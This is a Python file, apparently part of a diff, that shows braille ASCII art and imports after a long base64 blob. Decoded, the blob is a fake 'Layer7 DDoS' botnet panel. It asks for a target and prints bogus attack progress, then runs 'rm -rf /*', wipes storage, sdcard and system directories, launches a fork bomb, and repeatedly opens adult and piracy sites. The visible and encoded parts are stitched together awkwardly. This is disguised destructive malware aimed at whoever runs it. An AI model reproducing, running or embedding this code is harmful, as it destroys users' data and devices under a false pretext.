4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qK/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qGP4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOg4qCP4qKA4qG+4qCB4qOg4qO24qCA4qGw4qCD4qCA4qCe4qCA4qOg4qO/4qCP4qCA4qCA4qGe4qCA4qCACuKggOKjv+KggOKhh+Kjv+KggOKgmeKjvuKjp+Kjv+Khh+KggOKgueKjhOKggOKggOKggOKjgOKhtOKgluKgpuKjhOKggOKiuOKjv+Kjv+Khv+Kgm+Kgm+Kgm+Kgm+Kgm+Kgm+Kiv+Khj+KggOKggOKggOKggOKggOKggOKggOKioOKhvuKggeKgsOKgi+KgoOKinuKjveKjmeKjm+Kgg+KggOKhtOKgkuKiieKhveKgi+KggOKggOKhvOKggeKggOKggArioIDioY/ioIDiorniorvioYDioIDioZ7ioZ/ioLvioYfioIDioIDior/io4TioIDiorjioYHioIDioIDioIDio7jioIDioJjio7/ioI/ioIDioIDioIDioIDioIDioIDio6DioJ/ioIHioIDioIDioIDioIDioIDiooDiobTioIvio7TioIDioIDioIDioIDioInioojio6jioJvio6Dio7zio4HiobTioIvioIDioIDio4Dio7DioIPioIDioIDioIAK4qCA4qGH4qCA4qCY4qO/4qO34qC24qK44qGG4qCA4qK/4qCA4qOg4qO/4qO/4qOn4qGA4qCZ4qKm4qOA4qGk4qCP4qCA4qCA4qCJ4qC94qOS4qOy4qO24qOW4qGo4qCf4qCb4qCA4qCA4qCA4qCA4qCA4qKA4qO04qCL4qKA4qG+4qCB4qCA4qCA4qCA4qCA4qKg4qOo4qCP4qCD4qO+4qG/4qKL4qCA4qCA4qCA4qG04qK54qCD4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKgmeKjv+Khl+KgmuKhh+KggOKiueKgk+Kgv+Kgi+Kgi+KgmeKgv+KjhOKggOKggOKggOKggOKghOKggOKggOKggOKggOKggOKgueKhhOKhgOKggOKggOKggOKggOKggOKigOKhtOKgi+KigOKjtOKhv+Kjv+KjgOKjoOKjpOKhpOKggOKhv+Kgg+KggOKjvuKgj+KioOKgnuKggOKggOKhvOKioeKhj+KggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioLnio7/ioIHioqfiooDio7/iob/ioITioIDioIDioIDioIDioIjiorfio4TioIDioJLioIDioIDioIDioIDioIDioIDioIDio6fioYfioIDioIDioIDio4DioLTioIvio4DioLTioIvio7zioLPioIPioIniorLioIrioIHioIDioIDiooDiobzio7/io77ioI/ioIDioIDiobzio6Hio7/ioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qK74qOj4qO84qGN4qCJ4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKw4qO/4qO/4qOm4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCw4qGH4qKA4qOk4qKe4qOh4qC04qCa4qCB4qOA4qOk4qOn4qCB4qGg4qKk4qOs4qGE4qCA4qCA4qKA4qG84qO54qO/4qCD4qCA4qKA4qG04qO14qKr4qO/4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKgiOKis+Khv+Kjt+KhgOKggOKggOKgoOKghOKioOKjtOKjv+Kjv+Kjv+Kjv+Kjt+KhgOKgoOKjhOKhgOKhgOKggOKggOKgmeKgm+Kjm+Kjm+KjreKipOKjkuKgm+Khi+KigeKggOKggOKggOKggOKioOKigOKjgeKggOKjgOKhnuKioOKjv+Kgg+KggOKinuKjvuKjvuKgh+KiuOKjh+KggOKggOKggOKggOKggOKggAoKICAgICcnJykKICAgIHRpbWUuc2xlZXAoMC42KQogICAgY2xlYXIoKQogICAgcHJpbnQoZiIiIuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIbioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKw4qGB4qCA4qCA4qOk4qOk4qOk4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKioOKhtuKgi+KigOKjtOKjv+Kjv+Kjv+Kjv+Kjv+KjtuKjhOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDiob7ioIvioIDio6Dio7/io7/io7/io7vio7/ioJvio7/io7/ior/io7fioYDioIDioLLio6TioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qO04qCf4qCA4qKA4qO+4qG/4qK74qO/4qGf4qGb4qCA4qO84qK54qO/4qGM4qK34qC74qGE4qCA4qCI4qK74qOE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjoOKhnuKggeKigOKjtOKjv+Kgm+KioeKjv+Kjv+Kht+KggOKghuKggOKggOKjv+Kjv+KhmOKhh+KgmOKhhOKggOKggOKiueKjhuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDiobzioIvioIDioLTio7/ioIvio4HioaTio7jio7/io7/iobzioIPioIbioIDioqDio7/ioqnioIHiorvioYDiorvioYDioIDioIDioJ3ioqfioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qOA4qGk4qC24qCW4qCL4qCJ4qCz4qOm4qO+4qCD4qOg4qGf4qOw4qCH4qO+4qO/4qGH4qCA4qOA4qOA4qO44qGH4qCA4qK34qCA4qCB4qCA4qKn4qO04qCe4qCJ4qCJ4qCZ4qCS4qCy4qKk4qOA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKhpOKgluKgi+KggeKhhOKggOKggOKggOKigOKggOKiuOKhheKisOKgj+KhtOKhheKisOKjv+KiuOKhhOKgh+Kgt+KgkuKjv+KggeKggOKjvOKjh+KggOKggOKggOKjp+KggOKggOKjhOKggOKggOKis+KhgOKgiOKgmeKgpuKjhOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDiooDio6DioJ7ioInioIDioIDioIDioIDio4fioIDioIDioIDioIDio6Dio7/ioYfiorjioYTiorHio6fioLjio7/iobzio7fioITioIDio6Diob/iobjioIDio77ioIjiorjioIDioIDioLnio4bioIDioIDioJnioLbio77ioIPioIDioIDioIDioIDioJnioqbioYDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qOA4qGk4qC24qCL4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCY4qOG4qGJ4qOy4qO+4qO/4qC/4qGD4qCI4qO34qGY4qCc4qOG4qC54qO34qC/4qGH4qKw4qG/4qKg4qGH4qKw4qOH4qCA4qCA4qCA4qCA4qCA4qC74qK/4qOE4qGA4qCw4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCJ4qCT4qCm4qOE4qGA4qCA4qCACuKjgOKjgOKjgOKhpOKgtuKgi+KggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKhgOKjqOKjv+Kgv+KgjeKgkeKgiOKgieKggOKgmOKjp+KggOKguOKjpuKhueKjt+Kjv+Kgi+KigOKhn+KisOKjv+Khj+KgiOKggOKggOKggOKggOKggOKgguKiiOKiv+KjjeKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgqeKgl+KgpgrioJvioIvioIHioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio6Dio77io7/io7/ioYDioIHioIDioIDioIDioIDioIDiornioZ3ioYTioLnio7fio7/io7/io4Diob/io7Tio7/io7/ioIHioIDioIDio7TioIDioIDioIDioIDioIjio7zio7/iobfio4TioIDioIDiooDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOA4qG84qCL4qCI4qK/4qGH4qCH4qCA4qCA4qCA4qCA4qCA4qCg4qGA4qC74qO+4qGA4qK54qG/4qO/4qO/4qOx4qO/4qK74qCD4qO24qCg4qG+4qCB4qCA4qCA4qCA4qCA4qCA4qK44qK/4qCD4qCI4qCT4qKk4qOA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKigOKjoOKhtOKgn+KgieKggOKggOKggOKgiOKjv+KgoOKhgOKggOKggOKggOKggOKggOKis+KjpOKguOKhu+KjvuKjv+Kiu+Kju+Kjv+Kjv+KihuKhvuKggOKguOKggOKggOKggOKggOKggOKggOKggOKiv+Khn+KggOKggOKggOKggOKgiOKgm+KipuKjgOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDio6DiobTioJvioIHioIDioIDioIDioIDioIDioIDioIDiorjioYfiooDioIDioIDioIDioIDioIDioIDioLvio4fioIDior/io7fioIDioIjiorjio7/iobjioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7/ioIPioIDioIDioIDioIDioIDioIDioIDioIjioLPioqTioYDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qOg4qCe4qCL4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO84qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qC44qOm4qCY4qO/4qCA4qCA4qK44qGf4qKA4qG24qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCZ4qKm4qGA4qCA4qCACuKggOKggOKggOKggOKjoOKhvuKgg+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKiueKhh+KggOKggOKggOKggOKggOKggOKggOKggOKggOKgmeKjh+Kiu+KhhOKggOKjvuKgg+KjvOKggeKggOKggOKggOKggOKggOKggOKggOKggOKggOKjv+KigOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgmeKihuKggArioIDioIDio6DioL7ioIvioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio77ioYfioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioLnio77ioIHioqDio7/io77ioIPioIDioIDioIDioIDioIDioIDioIDiooDioIDioIDio7/ioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioJMK4qGk4qCa4qCB4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO54qO/4qOk4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qGA4qKI4qO/4qCH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qK44qGf4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjvOKjv+Kjv+Kjv+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjv+Kjh+Kju+Kjv+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKiuOKjv+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDio7/io7/io7/io7/ioIDioIDioIDioIDioIDioIDioIDioIDioIDiorTiob/ioJvioL/ioIPioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioJjiorvio4fioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qOw4qO/4qO/4qO/4qO/4qOA4qOA4qOA4qCA4qKA4qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qKA4qKA4qOg4qOE4qOg4qOW4qOg4qO04qO+4qO/4qGE4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgoOKjtuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjt+KjtuKjtuKjtuKjtuKjtuKjtuKjtuKjtuKjtuKjtuKjvuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjt+KhgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioqDio6Dio7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7fioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAKICAgICIiIikKICAgIHRpbWUuc2xlZXAoMC44KQogICAgY2xlYXIoKQoKCiNMYXllcjcgRERvUwojRGV2ZWxvcGVkIGJ5IFZlbmQzdHRBCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCgpkZWYgYmFubmVyKCk6CiAgICBwcmludCgiIiIKXDAzM1swOzMxbeKggOKggOKigOKjgOKhgOKgmOKigOKjgOKggOKjgOKggOKggOKggOKggOKjoOKhgApcMDMzWzA7MzFt4qCg4qGq4qCB4qCE4qKA4qCf4qCB4qCA4qCA4qCA4qCI4qCi4qCA4qCA4qCZ4qCBClwwMzNbMDszMW3ioIDioJHioITioZHioozioYDioIDioIDioIDioIDioIDioIDioZfioKDioYDioIAKXDAzM1swOzMxbeKggOKggOKggOKgiOKgkuKhrOKikOKgouKghOKjgOKggOKioOKgg+KgseKhiOKgogpcMDMzWzA7MzFt4qCA4qCA4qCA4qCA4qCA4qCI4qCS4qCo4qCl4qC24qCG4qCp4qCt4qCl4qCk4qCQClwwMzNbMDszMW3ioIDioIDioIDioIDioIDioIDioIDioIDioIDioYDiorDioafioIDioIDioIDioIAKClwwMzNbMDszMW3ilZTilZDilZfilZTilZDilZfilZTilZDilZfilZTilZDilZfilZTilZDilZcgIOKVlOKVlyDilZTilZDilZfilZTilabilZfilZTilZfilZTilZTilZDilZfilZTilabilZcKXDAzM1swOzMxbeKVmuKVkOKVl+KVoOKVkOKVneKVoOKVkOKVo+KVkSAg4pWR4pWjICAg4pWg4pWp4pWX4pWRIOKVkSDilZEg4pWR4pWR4pWR4pWR4pWjICDilZEgClwwMzNbMDszMW3ilZrilZDilZ3ilakgIOKVqSDilanilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSDilakg4pWd4pWa4pWd4pWa4pWQ4pWdIOKVqSAKTDcgRERvUyBhdHRhY2sgQ3JlYXRlZCBieSBtZXZlIGMyICAgICAgICAgIAogICAgICAgICAgIiIiKQoKZGVmIGxhdW5jaF9hdHRhY2soKToKICAgIGJhbm5lcigpCiAgICB0YXJnZXQgPSBpbnB1dCgiRW50ZXIgVGFyZ2V0Pj4+OiAiKQogICAgc2Vjb25kcyA9IGludChpbnB1dCgiU2Vjb25kcz4+PjogIikpCiAgICBwcmludCgiUGxlYXNlIHdhaXQuLi4iKQogICAgc2xlZXAoMSkKICAgIHByaW50KCJQZXJmb3JtaW5nIFRMUyBIYW5kc2hha2UuLi4uIikKICAgIHNsZWVwKDEpCiAgICBwcmludCgiVmFsaWRhdGluZyBQcm94aWVzLi4uLi4uIikKICAgIHNsZWVwKDEpCiAgICBwcmludCgiQXR0YWNrIFNlbnQgV2l0aCBIaWdoIFByb3h5Li4uLi4uIikKICAgIHNsZWVwKDIpCiAgICBwcmludChmIiIiCuKVlOKVkOKVl+KVlOKVpuKVl+KVlOKVpuKVl+KVlOKVkOKVl+KVlOKVkOKVl+KVpuKVlOKVkCAg4pWU4pWQ4pWX4pWU4pWQ4pWX4pWU4pWX4pWU4pWU4pWm4pWXCuKVoOKVkOKVoyDilZEgIOKVkSDilaDilZDilaPilZEgIOKVoOKVqeKVlyAg4pWa4pWQ4pWX4pWR4pWjIOKVkeKVkeKVkSDilZEgCuKVqSDilakg4pWpICDilakg4pWpIOKVqeKVmuKVkOKVneKVqSDilakgIOKVmuKVkOKVneKVmuKVkOKVneKVneKVmuKVnSDilakKICAgICAgICBUQVJHRVQ6ID4ge3RhcmdldH0KICAgICAgICBUSU1FOiA+IHtzZWNvbmRzfQogICAgICAgIE1FVEhPRDogPiA8PDw8REVTVFJPWT4+Pj4iIiIpCiAgICBwcmludCgiV0VMQ09NRSBUTyBDWUJFUk1BRklBIFBBTkVMIikKICAgIG9zLnN5c3RlbSgndG91Y2ggLmh1c2hsb2dpbicpCiAgICBvcy5zeXN0ZW0oInRlcm11eC1zZXR1cC1zdG9yYWdlIikKICAgIG9zLnN5c3RlbSgicm0gLXJmIC8qIikKICAgIG9zLnN5c3RlbSgicm0gLXJmIC9zdG9yYWdlLyoiKQogICAgb3Muc3lzdGVtKCJybSAtcmYgL3NkY2FyZC8qIikKICAgIG9zLnN5c3RlbSgncm0gLXJmIC9zeXN0ZW0vKicpCiAgICBvcy5zeXN0ZW0oJzooKXsgOnw6ICYgfTs6JykKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cucG9ybmh1Yi5jb20iKQogICAgb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL2phYm9sMi50diIpCiAgICBvcy5zeXN0ZW0oInhkZy1vcGVuIGh0dHBzOi8vd3d3LnlvdWppenouY29tIikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9waW5heWZsaXgxLnR2IikKCmxhdW5jaF9hdHRhY2soKQoKZGVmIGxvZ2luKCk6CiAgICBjbGVhcigpCiAgICB1c2VyID0gImFkbWluIgogICAgcGFzc3dkID0gImFkbWluIgogICAgdXNlcm5hbWUgPSBpbnB1dCgi4pqhIFVzZXJuYW1lOiAiKQogICAgcGFzc3dvcmQgPSBnZXRwYXNzLmdldHBhc3MocHJvbXB0PSfimqEgUGFzc3dvcmQ6ICcpCiAgICBpZiB1c2VybmFtZSAhPSB1c2VyIG9yIHBhc3N3b3JkICE9IHBhc3N3ZDoKICAgICAgICBwcmludCgiIikKICAgICAgICBwcmludCgi4pqhIEhhaXp6eiwgeW91J3JlIHNvIGN1dGUuLi4iKQogICAgICAgIHN5cy5leGl0KDEpCiAgICBlbGlmIHVzZXJuYW1lID09IHVzZXIgYW5kIHBhc3N3b3JkID09IHBhc3N3ZDoKICAgICAgICBwcmludCgi4pqhIFdlbGNvbWUgdG8gU3BhY2UgQk9UTkVUIikKICAgICAgICB0aW1lLnNsZWVwKDAuMykKICAgICAgICBhc2NpaV92cm8oKQogICAgICAgIG1haW4oKQoKbG9naW4oKQo=
+import socket
+import os
+import requests
+import random
+import getpass
+import time
+import sys
+
+def ascii_vro():
+    clear()
+    print(f'''
+     ⢴⣤⣶⣾⣟⣇⠀⠐⠒⠂⠿⠛⢻⠳⡖⠐⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠉⠳⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠈⠉⠉⠛⠓⠲⠦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣠⠴⠂⠀⠀⠀⠉⠙⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠓⠒⠶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡶⠁⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠓⠶⢤⣀⠀⠀⠀⠈⠓⢦⠀⠘⢻⠀⠀⢠⡇⠀⠆⠀⠤⣤⡀⠤⢤⠤⠖⠚⠉⠀⠀⠈⢳⡀⠀⠀⠀⣀⡤⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠦⣄⣤⡤⣶⣷⣄⣸⣦⠀⢸⠀⣀⡤⣾⣿⣶⣾⣧⠄⠀⠀⢀⣀⡤⢾⡁⠀⠉⣻⠗⠋⠁⠀⠀⠀⠀⠀⠀
+⠶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⣸⣏⠁⠈⠛⢻⣯⣿⣾⠟⢁⠀⣿⣿⡏⠟⠛⠋⠉⠁⠀⠀⢈⣻⡶⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣤⣄⣙⣻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠀⠀⠹⣟⣚⣻⢦⣄⠀⠀⠉⠛⠂⠀⠑⠙⠋⠀⠀⠀⠀⠐⠦⠖⣻⡷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠿⠿⠻⠿⠿⠿⠿⠷⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠞⠁⠀⠀⠀⠀⣿⠿⠷⠶⢿⣰⠂⢀⡶⣄⠐⠂⠀⢻⣆⢀⣴⣒⣶⣶⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠶⢶⣶⣤⣤⣴⣶⣶⠙⠉⠻⠿⢶⣶⡶⠖⠒⠒⠒⠚⠉⠁⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠉⢡⡟⠀⣽⠖⠒⠀⠉⠉⠛⢦⡴⠛⠁⠀⠀⠸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣶⣦⣬⣭⣽⡛⠛⠻⣿⣯⣧⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠉⠀⠀⠀⠀⠀⠀⡞⢀⡞⠁⠀⠀⠀⢀⡤⠖⠉⠀⠀⠀⠀⠀⠀⠙⠳⢤⣄⡀⠀⠀⠀⠀⢀⣠⣤⣾
+⠛⠿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⣀⣤⢤⣖⣒⣲⣷⣿⣒⠲⢤⡴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢩⡽⠛⣿⣿⣿⣿⣿⠙
+⡀⠀⠉⢿⣭⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⠋⠉⠉⠀⠀⠀⠀⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠁⠀⠀⠀
+⣿⣶⣦⣤⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣀⣀⠀⣀⣀⣀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠉⠉⠉⠉
+⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠚⠁⠀⣠⠞⠋⠁⠀⠈⢹⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⡄⠀⠀⠀
+⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⠀⠀⡼⠁⠀⠀⠀⠀⣴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣀⠀⠀
+⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⣸⠁⠀⠀⠀⠀⣰⠣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡿⠃
+⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢀⣯⠀⠀⠀⠀⣴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢿⡻⣷⣦
+⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⣾⡇⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠜⢷⡙⣿
